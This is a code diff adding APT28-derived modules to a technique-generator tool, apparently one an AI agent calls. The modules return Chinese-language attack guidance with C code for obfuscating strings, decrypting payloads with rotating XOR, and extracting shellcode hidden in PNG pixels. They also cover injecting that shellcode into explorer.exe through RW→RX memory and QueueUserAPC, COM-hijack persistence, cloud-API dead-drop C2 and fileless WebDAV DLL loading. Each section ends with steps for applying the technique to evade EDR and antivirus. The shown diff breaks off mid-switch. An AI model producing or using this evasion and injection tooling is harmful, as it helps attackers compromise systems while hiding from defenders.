@@ -820,10 +820,719 @@ Sliver follows a specific operational sequence that differs from Havoc.
 - For targeting: use execution limits to scope implant to specific hosts/users`
 }
 
+// ── APT28 (Operation Neusploit) — Alternating Byte XOR + Null Padding ──────
+
+function apt28StringObfuscation(): string {
+  return `## APT28 交替字节XOR + Null填充 字符串混淆（SimpleLoader.dll 逆向分析）
+
+### 问题:
+静态分析工具（strings、YARA规则）通过匹配连续可读字符串来识别恶意软件。
+如果DLL中包含 "C:\\\\Windows\\\\System32\\\\cmd.exe" 这样的连续字符串，
+YARA规则可以立即匹配到。
+
+### APT28的解决方案: 交替真实字符 + Null填充 + XOR解密
+
+**编码格式**: 真实字符和垃圾字节交替排列:
+\`\`\`
+原始字符串: "cmd.exe"
+编码后（内存中）: [c][0x00][m][0x00][d][0x00][.][0x00][e][0x00][x][0x00][e][0x00][0x00][0x00]
+               真实字节  垃圾    真实字节  垃圾    ...
+\`\`\`
+
+**运行时解密算法**:
+\`\`\`c
+wchar_t* DecryptString(const uint8_t* encrypted, size_t length, uint8_t xorKey) {
+    wchar_t* result = (wchar_t*)malloc(length / 2 * sizeof(wchar_t));
+    size_t outIdx = 0;
+
+    for (size_t i = 0; i < length; i += 2) {
+        // 只处理真实字符位置（偶数索引），跳过垃圾字节（奇数索引）
+        uint8_t realByte = encrypted[i];     // 真实字符
+        // encrypted[i+1] 是null/垃圾字节，直接跳过
+
+        result[outIdx++] = (wchar_t)(realByte ^ xorKey);  // XOR解密
+    }
+    result[outIdx] = L'\\0';
+    return result;
+}
+\`\`\`
+
+**APT28使用的XOR密钥**:
+- **0x43**: 单字节XOR，用于互斥量名称混淆
+- **多字节密钥**: 用于API名称和路径字符串
+
+**为什么有效**:
+1. **打破连续字符串**: 真实字符被垃圾字节分隔，strings命令看到的是乱码
+2. **YARA规则失效**: 无法匹配连续字符串模式
+3. **内存中才解密**: 只有运行时动态分配的内存中才出现明文
+4. **XOR密钥可更换**: 不同样本使用不同密钥，避免签名匹配
+
+**如何应用到评估**:
+- 对C payload中的敏感字符串（API名、路径、URL）使用交替字节编码
+- 运行时用一个简单的循环解密，避免明文出现在二进制中
+- 这比简单Base64更有效 — Base64编码的字符串本身是可识别的模式`
+}
+
+// ── APT28 — 76字节轮转XOR密钥载荷解密 ─────────────────────────────────────
+
+function apt28RotatingXOR(): string {
+  return `## APT28 76字节轮转XOR密钥 — 核心载荷解密（SimpleLoader.dll 分析）
+
+### 问题:
+单字节XOR（如0x43）密钥空间只有256种可能，可以被暴力破解。
+固定密钥XOR对已知明文攻击脆弱。
+
+### APT28的解决方案: 76字节轮转XOR密钥
+
+**核心载荷**（通常加密存放在DLL的 .rdata 段或自定义资源段）
+使用一个 **76字节长的密钥** 进行轮转异或加密。
+
+**解密算法**:
+\`\`\`c
+// 76字节轮转XOR解密 — APT28 SimpleLoader核心载荷解密
+uint8_t* DecryptPayload(const uint8_t* encryptedData, size_t dataLen,
+                        const uint8_t* key, size_t keyLen) {
+    // keyLen = 76 (APT28使用固定76字节密钥)
+
+    // 步骤1: 分配PAGE_READWRITE权限的内存
+    void* decrypted = VirtualAlloc(NULL, dataLen,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!decrypted) return NULL;
+
+    // 步骤2: 逐字节轮转XOR解密
+    uint8_t* out = (uint8_t*)decrypted;
+    for (size_t i = 0; i < dataLen; i++) {
+        out[i] = encryptedData[i] ^ key[i % keyLen];  // 轮转索引: i % 76
+    }
+
+    // 步骤3: 解密后内容可能还不是直接可执行代码
+    // APT28: 解密后得到的是PNG图片，需要进一步隐写提取
+
+    return (uint8_t*)decrypted;
+}
+\`\`\`
+
+**密钥管理**:
+- 76字节密钥本身也被混淆存储（可能用单字节XOR 0x43加密）
+- 密钥在DLL数据段中以非连续方式存储
+- 不同样本使用不同密钥
+
+**为什么是76字节**:
+- 密钥长度足够大（76字节 = 608位），暴力破解不可行
+- 但又不会太大导致解密性能开销
+- 轮转XOR = 多表替代密码，比单字节XOR安全得多
+
+**与单字节XOR对比**:
+| 单字节XOR (0x43) | 76字节轮转XOR |
+|-----------------|--------------|
+| 密钥空间: 256 | 密钥空间: 2^(76*8) = 2^608 |
+| 可被频率分析破解 | 多表替代，频率分析无效 |
+| YARA可写简单规则 | 每个样本密钥不同 |
+| 暴力破解瞬间完成 | 暴力破解不可能 |
+
+**如何应用**:
+- 对核心payload使用多字节轮转XOR加密
+- 密钥存储在混淆后的数据段中
+- 运行时动态解密到RW权限内存`
+}
+
+// ── APT28 — PNG隐写术提取Shellcode ───────────────────────────────────────
+
+function apt28PNGSteganography(): string {
+  return `## APT28 PNG隐写术 — 从图片像素提取Shellcode（SimpleLoader.dll 分析）
+
+### 问题:
+直接将shellcode存储在二进制文件中容易被静态分析识别。
+EDR/AV可以扫描内存中的shellcode特征码。
+
+### APT28的解决方案: 将shellcode藏在PNG图片的像素数据中
+
+这是APT28 Operation Neusploit中最具技术含量的部分。
+SimpleLoader内置了**完整的PNG解码器**（10个专用函数），不依赖外部库。
+
+### PNG文件结构:
+\`\`\`
+PNG文件 = PNG Signature (8字节) + Chunks
+  ├── IHDR Chunk: 图片头（宽、高、位深、颜色类型）
+  ├── PLTE Chunk: 调色板（索引颜色模式）
+  ├── IDAT Chunk: 图像数据（压缩的像素数据）— shellcode藏在这里
+  └── IEND Chunk: 图片结束标记
+\`\`\`
+
+### APT28的PNG解码流程（10个专用函数）:
+\`\`\`c
+// 步骤1: 解析IHDR头
+ParseIHDR(pngData, offset) → width, height, bitDepth, colorType
+
+// 步骤2: 遍历所有Chunk
+while (chunkType != "IEND") {
+    chunkLength = ReadUint32(pngData, offset);
+    chunkType = ReadString(pngData, offset + 4, 4);
+
+    if (chunkType == "PLTE") {
+        // 提取调色板
+        ExtractPalette(pngData, offset + 8, chunkLength);
+    }
+    else if (chunkType == "IDAT") {
+        // 核心数据块 — shellcode隐藏在IDAT中
+        // IDAT包含zlib压缩的像素数据
+        DecompressIDAT(pngData, offset + 8, chunkLength);
+        pixelData = InflateZlib(compressedData);
+    }
+
+    offset += 12 + chunkLength;  // length(4) + type(4) + data + crc(4)
+}
+\`\`\`
+
+### LSB提取算法（APT28的方法）:
+\`\`\`c
+// 步骤3: 从像素数据中提取隐藏数据（LSB - 最低有效位）
+uint8_t* ExtractHiddenData(uint8_t* pixelData, size_t pixelLen, size_t hiddenLen) {
+    uint8_t* hidden = malloc(hiddenLen);
+    size_t bitIndex = 0;
+
+    // APT28使用特定偏移量和掩码提取
+    // 可能的方法: 只提取每个像素RGB通道的最低位
+    for (size_t i = 0; i < hiddenLen * 8; i++) {
+        // 从像素数据的最低位提取1bit
+        uint8_t lsb = pixelData[APT28_OFFSETS[i] % pixelLen] & 0x01;
+        hidden[i / 8] |= (lsb << (7 - (i % 8)));
+    }
+
+    return hidden;
+}
+
+// 或者按步长跳跃读取:
+uint8_t* ExtractWithStride(uint8_t* pixelData, size_t stride, size_t mask) {
+    // stride = 步长（每隔N个像素读取一次）
+    // mask = 掩码（如0x01取LSB，0x03取最低2位）
+    // APT28可能使用自定义stride和mask组合
+}
+\`\`\`
+
+### 完整的APT28解密链:
+\`\`\`
+1. 从DLL资源段读取加密的PNG文件 (SplashScreen.png)
+   ↓
+2. 76字节轮转XOR解密PNG文件数据
+   ↓
+3. 解析PNG格式 → 10个专用函数处理IHDR/PLTE/IDAT/IEND
+   ↓
+4. 从IDAT chunk提取压缩像素数据 → zlib解压
+   ↓
+5. LSB提取: 从像素最低位还原隐藏的二进制流
+   ↓
+6. 最后一道解密 (XOR或RC4) → 得到真正的shellcode
+   ↓
+7. VirtualAlloc(RW) → 写入shellcode → VirtualProtect(RX) → 执行
+\`\`\`
+
+### 为什么PNG隐写有效:
+1. **静态分析绕过**: PNG图片看起来是正常的图片文件
+2. **YARA规则失效**: shellcode不连续存储在二进制中
+3. **需要完整的PNG解析器**才能提取 — 增加了逆向分析难度
+4. **多层加密**: XOR → PNG压缩 → LSB → 最终XOR/RC4
+5. **网络流量中不易检测**: 传输图片文件是正常的网络行为
+
+### 如何应用到评估:
+- 将shellcode嵌入PNG图片的LSB位
+- 加载器内置精简PNG解析逻辑
+- 多层加密增加分析难度
+- 图片文件在磁盘和网络中都不引起怀疑`
+}
+
+// ── APT28 — RW→RX页面转换（避免RWX检测） ──────────────────────────────────
+
+function apt28MemoryPermissionTransition(): string {
+  return `## APT28 内存权限转换 — RW→RX避免EDR检测
+
+### 问题:
+现代EDR对 PAGE_EXECUTE_READWRITE (RWX) 内存极其敏感。
+直接分配RWX权限内存 → 写入shellcode → 执行，是最常见的恶意软件模式。
+许多EDR规则直接告警: "进程分配了RWX内存"。
+
+### APT28的解决方案: 两阶段内存权限管理
+
+**APT28的做法（SimpleLoader + CovenantGrunt注入流程）**:
+\`\`\`c
+// 步骤1: 分配 PAGE_READWRITE (RW) 权限内存 — 不触发RWX告警
+LPVOID shellcodeAddr = VirtualAllocEx(
+    hProcess,                    // explorer.exe句柄
+    NULL,                        // 让系统选择地址
+    shellcodeSize,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_READWRITE               // 注意: RW, NOT RWX!
+);
+
+// 步骤2: 写入shellcode（此时内存是RW，可以写入）
+WriteProcessMemory(hProcess, shellcodeAddr, decryptedShellcode, shellcodeSize, NULL);
+
+// 步骤3: 关键一步 — 修改权限为 PAGE_EXECUTE_READ (RX)
+DWORD oldProtect;
+VirtualProtectEx(
+    hProcess,
+    shellcodeAddr,
+    shellcodeSize,
+    PAGE_EXECUTE_READ,           // RX, 不是RWX!
+    &oldProtect
+);
+
+// 步骤4: 执行shellcode（此时内存是RX，只能读和执行）
+CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
+\`\`\`
+
+### 为什么这比RWX更安全:
+| 权限 | 写入 | 执行 | EDR告警 |
+|------|------|------|---------|
+| PAGE_EXECUTE_READWRITE (RWX) | 是 | 是 | **高** — 最常见恶意模式 |
+| PAGE_READWRITE → PAGE_EXECUTE_READ (RW→RX) | 阶段1 | 阶段2 | **低** — 合法软件也这样做 |
+| PAGE_READWRITE (RW) | 是 | 否 | 无 — 但无法执行 |
+| PAGE_EXECUTE_READ (RX) | 否 | 是 | 低 — 但无法写入 |
+
+### 合法软件也使用RW→RX:
+- JIT编译器（V8 JavaScript引擎、.NET CLR）: 先写入编译代码(RW)，再设置为可执行(RX)
+- 动态链接器: 先加载代码到内存(RW)，然后fixup重定位后设为RX
+- 因此RW→RX在合法软件中很常见，EDR难以区分
+
+### APT28的更精细做法:
+\`\`\`c
+// CovenantGrunt使用的内存权限转换:
+
+// 1. 先分配RW内存
+LPVOID mem = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT, PAGE_READWRITE);
+
+// 2. 写入加密的shellcode
+WriteProcessMemory(hProcess, mem, encryptedShellcode, size, NULL);
+
+// 3. 在目标进程中就地解密（仍为RW权限）
+// 这样EDR即使扫描内存，看到的是解密过程中的混合数据
+
+// 4. 解密完成后立即修改为RX
+VirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, &oldProtect);
+
+// 5. 执行 — 此时内存只有RX权限，无法再修改
+\`\`\`
+
+### 如何应用到评估:
+- 永远不要直接分配RWX内存
+- 使用两阶段: RW写入 → RX执行
+- 更隐蔽的做法: 在RW阶段就解密完成，然后立即转RX
+- 这比简单的VirtualAlloc+RWX要安全得多`
+}
+
+// ── APT28 — APC注入（QueueUserAPC） ──────────────────────────────────────
+
+function apt28APCInjection(): string {
+  return `## APT28 APC注入 — QueueUserAPC比CreateRemoteThread更隐蔽
+
+### 问题:
+CreateRemoteThread是最常见的进程注入执行方式，
+也是EDR重点监控的API调用。创建远程线程 = 高告警等级。
+
+### APT28的解决方案: 异步过程调用（APC）注入
+
+**APC注入流程**:
+\`\`\`c
+// 步骤1: 枚举进程，找到目标（如explorer.exe）
+HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+PROCESSENTRY32 pe32;
+pe32.dwSize = sizeof(PROCESSENTRY32);
+Process32First(hSnapshot, &pe32);
+
+DWORD targetPid = 0;
+do {
+    if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
+        targetPid = pe32.th32ProcessID;
+        break;
+    }
+} while (Process32Next(hSnapshot, &pe32));
+
+// 步骤2: 打开目标进程
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+
+// 步骤3: 在目标进程中分配内存 (RW权限)
+LPVOID mem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
+    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+// 步骤4: 写入shellcode
+WriteProcessMemory(hProcess, mem, shellcode, shellcodeSize, NULL);
+
+// 步骤5: 修改权限为RX
+VirtualProtectEx(hProcess, mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+
+// 步骤6: 【关键区别】使用QueueUserAPC而非CreateRemoteThread
+// 枚举目标进程的所有线程
+HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+THREADENTRY32 te32;
+te32.dwSize = sizeof(THREADENTRY32);
+Thread32First(hThreadSnap, &te32);
+
+do {
+    if (te32.th32OwnerProcessID == targetPid) {
+        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
+        if (hThread) {
+            // 将shellcode地址加入APC队列
+            // 当线程进入"可告警等待状态"时自动执行
+            QueueUserAPC((PAPCFUNC)mem, hThread, 0);
+            CloseHandle(hThread);
+            break;
+        }
+    }
+} while (Thread32Next(hThreadSnap, &te32));
+\`\`\`
+
+### APC注入为什么更隐蔽:
+1. **不创建新线程**: QueueUserAPC不创建新线程，只是往现有线程的APC队列添加一个回调
+2. **EDR监控较少**: CreateRemoteThread是EDR重点监控的API，QueueUserAPC监控较少
+3. **执行时机隐蔽**: APC在目标线程进入"可告警等待状态"（SleepEx、WaitForSingleObjectEx等）时执行
+4. **线程上下文**: shellcode在目标进程的正常线程中执行，不是新线程
+
+### APC注入的局限:
+- 需要目标线程进入可告警等待状态才会触发
+- 如果目标线程很忙或不调用可告警等待函数，APC可能延迟执行
+- 解决: explorer.exe经常进入等待状态（等待用户输入），所以是理想目标
+
+### 对比:
+| CreateRemoteThread | QueueUserAPC |
+|-------------------|-------------|
+| 创建新线程 | 复用现有线程 |
+| EDR重点监控 | EDR监控较少 |
+| 立即执行 | 等待可告警状态 |
+| 容易被检测 | 更隐蔽 |
+
+### 如何应用到评估:
+- 进程注入时优先使用APC而非CreateRemoteThread
+- 选择经常进入等待状态的进程（explorer.exe、svchost.exe）
+- 结合RW→RX权限转换，进一步降低检测率`
+}
+
+// ── APT28 — COM劫持持久化 ────────────────────────────────────────────────
+
+function apt28COMHijacking(): string {
+  return `## APT28 COM劫持持久化 — InprocServer32注册表修改
+
+### 问题:
+传统的Run键注册表启动项（HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run）
+容易被安全软件监控和检测到。
+
+### APT28的解决方案: COM组件劫持
+
+APT28修改注册表中的COM组件注册信息，将合法CLSID的InprocServer32指向自己的DLL。
+
+### APT28使用的具体注册表路径:
+\`\`\`
+HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}\\\\InprocServer32
+\`\`\`
+
+**修改前**: (默认值) = C:\\\\Windows\\\\System32\\\\legit.dll （合法系统DLL）
+**修改后**: (默认值) = C:\\\\Users\\\\Public\\\\伪装名.dll （APT28的后门DLL）
+
+### COM劫持的工作原理:
+\`\`\`
+1. 系统或合法应用尝试创建COM对象 {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
+   ↓
+2. Windows COM运行时查询注册表: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
+   ↓
+3. 读取 (默认值) 注册表项 → 获取DLL路径
+   ↓
+4. 调用 LoadLibrary(DLL路径) 加载DLL
+   ↓
+5. APT28的后门DLL被加载到合法进程的内存中
+   ↓
+6. DLL的DllMain执行 → 启动后门/C2通信
+\`\`\`
+
+### 为什么COM劫持有效:
+1. **隐蔽**: 不修改Run键等常见自启动位置
+2. **合法触发**: 系统操作正常触发COM组件加载，不是恶意进程启动
+3. **权限要求低**: HKCU（当前用户）权限即可修改，不需要管理员
+4. **加载到合法进程**: DLL被系统/合法应用加载，进程看起来正常
+5. **持久化**: 每次系统尝试加载该COM组件时都会触发
+
+### APT28的额外隐蔽措施:
+\`\`\`
+# 使用不常见但合法的CLSID:
+{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}
+  - 这是Windows系统中的一个COM组件
+  - 不常用，被劫持后不容易被发现
+
+# 伪装DLL文件名:
+使用看起来合法的名字，如:
+  - msedge_update.dll
+  - onedrive_sync.dll
+  - windows_helper.dll
+
+# 线程延迟启动:
+在DllMain中不直接执行后门代码，而是:
+1. 创建新线程
+2. 线程Sleep随机时间（避免启动时立即触发）
+3. 然后执行C2连接
+\`\`\`
+
+### 其他可劫持的COM键值:
+\`\`\`
+HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\InprocServer32    # DLL加载
+HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{...}\\\\LocalServer32    # EXE加载
+HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\ContextMenuHandlers  # 右键菜单
+HKCU\\\\Software\\\\Classes\\\\*\\\\shellex\\\\PropertySheetHandlers # 属性页
+\`\`\`
+
+### 如何应用到评估:
+- 使用不常见的CLSID进行劫持
+- DLL名称伪装成合法软件
+- 在DllMain中使用延迟执行
+- 劫持后DLL被合法进程加载，进程行为看起来正常`
+}
+
+// ── APT28 — Dead Drop Resolver（云API C2） ───────────────────────────────
+
+function apt28DeadDropResolver(): string {
+  return `## APT28 Dead Drop Resolver — 合法云API作为C2通信信道
+
+### 问题:
+直接连接攻击者的C2服务器容易被网络监控检测到。
+固定的IP、域名、端口、协议都是网络签名的基础。
+
+### APT28的解决方案: 使用合法云服务API作为Dead Drop
+
+APT28的CovenantGrunt后门不直接连接攻击者IP，
+而是使用 **filen.io**（合法云盘服务）的官方API进行交互。
+
+### Dead Drop工作原理:
+\`\`\`
+1. CovenantGrunt定期（Beaconing）发起HTTPS请求到filen.io的API:
+   → POST https://api.filen.io/v1/file/list
+   → 看起来像正常的云盘同步操作
+
+2. 攻击者在filen.io的特定共享目录中放置指令:
+   → 指令隐藏在正常文件的特定字段中
+   → 可能是加密的配置文件、文本文件、甚至图片元数据
+
+3. 植入物下载并解析文件:
+   → 提取隐藏的指令（如执行命令、下载新模块等）
+   → 执行指令后将结果上传到另一个隐藏位置
+
+4. 双向通信:
+   → 植入物读取 → 获取攻击者指令
+   → 植入物写入 → 上传执行结果
+\`\`\`
+
+### 为什么Dead Drop有效:
+1. **合法域名**: filen.io是合法云服务，不会被防火墙/IDS封禁
+2. **HTTPS加密**: 所有通信通过HTTPS，中间人无法看到内容
+3. **流量正常**: 看起来像正常的云盘API调用
+4. **无固定C2基础设施**: 不需要攻击者运营C2服务器
+5. **异步通信**: 指令和结果通过第三方平台中转
+6. **快速切换**: 可以换用其他云服务（Google Drive, Dropbox等）
+
+### 类似技术:
+- Dropbox作为Dead Drop
+- GitHub/GitLab仓库存放指令
+- Pastebin作为命令中转站
+- Telegram Bot API作为C2信道
+- Discord Webhook作为C2信道
+
+### Dead Drop的通信流程:
+\`\`\`c
+// 伪代码 — APT28 CovenantGrunt的Dead Drop通信
+void BeaconAndCheckCommands() {
+    // 1. 生成看起来正常的API请求
+    char* request = BuildFilenAPIRequest(
+        "POST", "/v1/file/list",
+        "Authorization: Bearer " + API_TOKEN,
+        "{\\"folder_id\\": \\"TARGET_FOLDER\\"}"
+    );
+
+    // 2. 通过系统代理或直连发送HTTPS请求
+    HTTPResponse* resp = SendHTTPSRequest(
+        "api.filen.io", 443,
+        request
+    );
+
+    // 3. 解析响应，提取隐藏指令
+    Command* cmd = ExtractHiddenCommand(resp->body);
+
+    if (cmd != NULL) {
+        // 4. 执行指令
+        Result* result = ExecuteCommand(cmd);
+
+        // 5. 上传结果到隐藏位置
+        UploadResult(result);
+    }
+}
+\`\`\`
+
+### 如何应用到评估:
+- 使用合法云服务的API进行C2通信
+- 指令隐藏在正常的API响应中
+- 利用HTTPS加密隐藏通信内容
+- 选择合适的云服务（API文档公开、流量正常、不被封锁）
+- 这种方法在对抗网络层检测时极其有效`
+}
+
+// ── APT28 — WebDAV UNC路径无落地执行 ─────────────────────────────────────
+
+function apt28WebDAVUNC(): string {
+  return `## APT28 WebDAV UNC路径 — DLL无落地内存加载执行
+
+### 问题:
+将恶意DLL写到磁盘上容易被文件监控检测。
+文件落地 → EDR扫描文件 → 检测到恶意特征。
+
+### APT28的解决方案: UNC路径直接从WebDAV服务器加载DLL，不写磁盘
+
+**APT28的LNK构造**:
+\`\`\`
+LNK文件的Target属性:
+C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\104.168.x.x\\\\webdav\\\\SimpleLoader.dll,EntryPoint
+
+关键点:
+1. 使用UNC路径 (\\\\server\\\\share\\\\file.dll)
+2. 通过Windows WebClient服务访问远程WebDAV共享
+3. DLL直接从网络加载到内存，不写到本地磁盘
+4. rundll32.exe是系统合法程序（LOLBin）
+\`\`\`
+
+### WebDAV UNC加载流程:
+\`\`\`
+1. 用户打开RTF/DOC文档
+   ↓
+2. OLE对象触发 → COM对象 Shell.Explorer.1 被实例化
+   ↓
+3. Shell.Explorer.1的LocationURL = \\\\104.168.x.x\\\\webdav\\\\payload.lnk
+   ↓
+4. Windows WebClient服务发起出站WebDAV请求
+   ↓
+5. payload.lnk被执行 → rundll32.exe加载SimpleLoader.dll
+   ↓
+6. SimpleLoader.dll从UNC路径映射到内存（不落地）
+   ↓
+7. rundll32.exe调用SimpleLoader.dll的EntryPoint
+\`\`\`
+
+### 底层API行为:
+\`\`\`c
+// 当访问UNC路径时:
+// 1. WebClient服务启动（如未运行则自动启动）
+// 2. 发起HTTP/WebDAV请求到远程服务器
+// 3. 将远程文件映射到本地网络驱动器
+// 4. rundll32.exe通过内存映射读取DLL
+// 5. LoadLibrary从网络路径加载DLL
+
+// 关键: 文件数据直接从网络流读取到内存
+// 不经过本地文件系统的Write操作
+\`\`\`
+
+### 为什么这有效:
+1. **无文件落地**: DLL不写入本地磁盘 — 文件监控检测不到
+2. **合法进程**: rundll32.exe是系统自带程序
+3. **合法协议**: WebDAV是Windows内置协议
+4. **LOLBin**: Living Off the Land Binary — 使用系统自带工具
+5. **系统服务级别**: 通过WebClient服务发起请求，下沉到系统服务层
+6. **绕过应用层监控**: 很多EDR只监控Office进程的HTTP请求，不监控系统服务
+
+### 互斥量防多开:
+\`\`\`c
+// SimpleLoader.dll运行的第一件事:
+// CreateMutexW — 确保只运行一次
+
+// 互斥量名称混淆:
+// 使用XOR 0x43解密互斥量名称
+const uint8_t encodedMutex[] = {0x41, 0x22, 0x55, ...}; // XOR 0x43后得到真实名称
+wchar_t* mutexName = DecryptString(encodedMutex, sizeof(encodedMutex), 0x43);
+
+HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName);
+if (GetLastError() == ERROR_ALREADY_EXISTS) {
+    // 已经感染过，立即退出
+    ExitProcess(0);
+}
+\`\`\`
+
+### 如何应用到评估:
+- 使用UNC路径从WebDAV加载DLL，避免文件落地
+- 结合rundll32.exe等LOLBin执行
+- 使用互斥量防止重复执行
+- 互斥量名称用XOR混淆存储`
+}
+
+// ── APT28 综合操作模式 ───────────────────────────────────────────────────
+
+function apt28OperationalPattern(): string {
+  return `## APT28 操作模式 — Operation Neusploit 完整感染链分析
+
+APT28在CVE-2026-21509利用中展现了多层递进的免杀对抗思路。
+
+### 完整感染链:
+\`\`\`
+第一阶段: 文档触发
+  RTF文件 → CVE-2026-21509 → COM对象 Shell.Explorer.1 → UNC路径访问
+
+第二阶段: WebDAV拉取
+  UNC \\\\attacker\\\\webdav\\\\ → payload.lnk + SimpleLoader.dll (无落地)
+
+第三阶段: SimpleLoader执行
+  CreateMutexW (防多开, XOR 0x43混淆)
+  → 交替字节XOR解密字符串
+  → VirtualAlloc(RW) 分配内存
+  → 76字节轮转XOR解密核心载荷
+  → PNG解码 (10个专用函数: IHDR/PLTE/IDAT/IEND)
+  → LSB隐写提取shellcode
+  → 最终XOR/RC4解密
+
+第四阶段: 进程注入
+  枚举explorer.exe进程
+  → VirtualAllocEx(RW) 分配内存
+  → WriteProcessMemory 写入shellcode
+  → VirtualProtectEx 修改为RX (不是RWX!)
+  → QueueUserAPC 注入 (不是CreateRemoteThread!)
+
+第五阶段: C2通信
+  CovenantGrunt .NET后门
+  → HTTPS到filen.io官方API (Dead Drop Resolver)
+  → 定期Beaconing检查指令
+  → 指令隐藏在文件/配置中
+
+第六阶段: 持久化
+  COM劫持: HKCU\\\\...\\\\CLSID\\\\{...}\\\\InprocServer32
+  → 将合法DLL路径替换为后门DLL
+  → 系统正常操作触发加载
+\`\`\`
+
+### APT28免杀对抗核心思路:
+1. **多层加密**: XOR(单字节) → XOR(轮转76字节) → PNG隐写 → 最终XOR/RC4
+2. **无文件落地**: UNC路径直接内存加载
+3. **合法工具**: rundll32.exe、WebClient服务、COM组件
+4. **权限最小化**: RW→RX，避免RWX
+5. **隐蔽执行**: APC注入 > CreateRemoteThread
+6. **合法C2**: 云API替代直接C2服务器
+7. **隐蔽持久化**: COM劫持替代Run键
+
+### 与Havoc/Sliver的区别:
+| APT28 | Havoc | Sliver |
+|-------|-------|--------|
+| PNG隐写载荷 | C源码编译 | Go编译 |
+| 76字节轮转XOR | Hash API解析 | Garble混淆 |
+| Dead Drop云API | 自建C2 | 多传输协议 |
+| COM劫持持久化 | N/A | 服务安装 |
+| UNC无落地 | N/A | N/A |
+| APC注入 | 间接syscall | CreateRemoteThread |
+| RW→RX转换 | N/A | RW→RX(有时) |
+
+### 如何应用:
+- 多层加密链: 至少2-3层加密叠加
+- 文件不落地的UNC/WebDAV加载
+- 使用LOLBin执行payload
+- APC注入替代CreateRemoteThread
+- 永远使用RW→RX而非RWX
+- 考虑Dead Drop模式的C2通信
+- COM劫持作为隐蔽持久化手段`
+}
+
 // ── Tool implementation ────────────────────────────────────────────────────
 
 interface TechniqueGeneratorInput {
-  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'custom'
+  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'sliver_strategy' | 'refresh_pe' | 'sgn_encoding' | 'traffic_encoder' | 'pe_donor' | 'dotnet_dual' | 'go_template' | 'apt28_strategy' | 'apt28_string_obf' | 'apt28_rotating_xor' | 'apt28_png_stego' | 'apt28_memory_transition' | 'apt28_apc_inject' | 'apt28_com_hijack' | 'apt28_dead_drop' | 'apt28_webdav_unc' | 'custom'
   payload: string
   platform?: 'windows' | 'linux'
   analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
@@ -853,13 +1562,22 @@ export class TechniqueGeneratorTool implements Tool {
 - pe_donor: PE metadata spoofing from legitimate binaries
 - dotnet_dual: Dual-mode .NET execution guidance (in-process CLR vs fork-and-run)
 - go_template: Go template conditional compilation principles
+- apt28_strategy: Return APT28 (Operation Neusploit) derived evasion strategy principles
+- apt28_string_obf: Alternating byte XOR + null padding string obfuscation (SimpleLoader)
+- apt28_rotating_xor: 76-byte rotating XOR key payload decryption
+- apt28_png_stego: PNG steganography shellcode extraction (IDAT LSB)
+- apt28_memory_transition: RW→RX page transition avoiding RWX detection
+- apt28_apc_inject: APC injection via QueueUserAPC (stealthier than CreateRemoteThread)
+- apt28_com_hijack: COM hijacking persistence via InprocServer32
+- apt28_dead_drop: Dead Drop Resolver — cloud API as C2 channel
+- apt28_webdav_unc: WebDAV UNC path DLL loading without disk landing
 - custom: Custom bypass technique`,
       parameters: {
         type: 'object',
         properties: {
           technique: {
             type: 'string',
-            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'custom'],
+            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'sliver_strategy', 'refresh_pe', 'sgn_encoding', 'traffic_encoder', 'pe_donor', 'dotnet_dual', 'go_template', 'apt28_strategy', 'apt28_string_obf', 'apt28_rotating_xor', 'apt28_png_stego', 'apt28_memory_transition', 'apt28_apc_inject', 'apt28_com_hijack', 'apt28_dead_drop', 'apt28_webdav_unc', 'custom'],
             description: 'Evasion technique type',
           },
           payload: { type: 'string', description: 'Original payload/command/shellcode' },
@@ -953,8 +1671,53 @@ export class TechniqueGeneratorTool implements Tool {
       case 'go_template':
         output = goTemplateCompilation()
         break
+      case 'apt28_strategy':
+        output = [
+          apt28OperationalPattern(),
+          '',
+          apt28StringObfuscation(),
+          '',
+          apt28RotatingXOR(),
+          '',
+          apt28PNGSteganography(),
+          '',
+          apt28MemoryPermissionTransition(),
+          '',
+          apt28APCInjection(),
+          '',
+          apt28COMHijacking(),
+          '',
+          apt28DeadDropResolver(),
+          '',
+          apt28WebDAVUNC(),
+        ].join('\n')
+        break
+      case 'apt28_string_obf':
+        output = apt28StringObfuscation()
+        break
+      case 'apt28_rotating_xor':
+        output = apt28RotatingXOR()
+        break
